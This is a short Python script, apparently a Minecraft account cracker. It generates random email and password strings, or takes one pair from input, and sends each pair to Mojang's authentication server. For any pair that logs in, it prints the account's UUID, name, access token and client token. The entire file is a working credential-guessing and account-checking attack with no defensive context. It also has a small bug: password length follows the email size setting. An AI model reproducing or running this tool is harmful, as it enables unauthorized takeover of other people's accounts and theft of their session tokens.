import random

import requests
import json

header = {"content-type": "application/json"}

gen = input("Generator Y/N: ")
gen = gen.lower()

if gen == "y":
    amount = int(input("Amount of accounts: "))
    emailSize = int(input('Enter the size of the email: '))
    typeE = input("Enter the email type: ")
    passwordSize = int(input("Enter the size of the password: "))
    for i in range(amount):
        char = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890_-"
        email = ""
        password = ""
        for i1 in range(emailSize):
            email = email + random.choice(char)
        email = email + typeE
        for i1 in range(emailSize):
            password = password + random.choice(char)

        body = json.dumps({
            'agent': {
                'name': 'Minecraft',
                'version': 1
            },
            'username': email,
            'password': password,
            'clientToken': "fff"
        })
        r = requests.post(url="https://authserver.mojang.com/authenticate",
                          headers=header,
                          data=body,
                          timeout=4)

        if r.status_code == 200:
            uuid = r.json().get("selectedProfile").get("id")
            name = r.json().get("selectedProfile").get("name")
            accessToken = r.json().get("accessToken")
            clientToken = r.json().get("clientToken")
            replace_dict = {
                "email": email,
                "password": password,
                "uuid": uuid,
                "name": name,
                "accessToken": accessToken,
                "clientToken": clientToken
            }
            print(replace_dict)
        else:
            print(" Invalid >> Email: "+email+" Password: "+password)
elif gen == "n":
    email = input(" Enter a email: ")
    password = input(" Enter the password: ")

    body = json.dumps({
        'agent': {
            'name': 'Minecraft',
            'version': 1
        },
        'username': email,
        'password': password,
        'clientToken': "fff"
    })
    r = requests.post(url="https://authserver.mojang.com/authenticate",
                      headers=header,
                      data=body,
                      timeout=4)

    if r.status_code == 200:
        uuid = r.json().get("selectedProfile").get("id")
        name = r.json().get("selectedProfile").get("name")
        accessToken = r.json().get("accessToken")
        clientToken = r.json().get("clientToken")
        replace_dict = {
            "email": email,
            "password": password,
            "uuid": uuid,
            "name": name,
            "accessToken": accessToken,
            "clientToken": clientToken
        }
        print(replace_dict)
    else:
        print(" Invalid >> Email: "+email+" Password: "+password)
else:
    print("Y/N")
    exit()
